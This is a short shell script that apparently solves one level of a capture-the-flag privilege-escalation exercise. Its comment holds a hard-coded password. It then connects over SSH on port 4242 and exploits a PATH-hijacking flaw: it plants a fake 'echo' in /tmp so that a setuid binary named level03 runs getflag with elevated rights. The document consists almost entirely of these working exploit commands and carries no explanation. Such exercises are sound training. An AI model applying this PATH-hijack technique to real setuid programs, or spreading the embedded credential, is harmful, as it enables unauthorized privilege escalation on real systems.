#! /usr/bin/env sh

# password: qi0maab88jeaj46qoumi7maus
ssh level04@$1 -p 4242 "cat /home/user/level03/level03"
ssh level04@$1 -p 4242 "export PATH=/tmp:\$PATH; echo \"#! /usr/bin/env getflag\" > /tmp/echo; chmod +x /tmp/echo; ./level03"
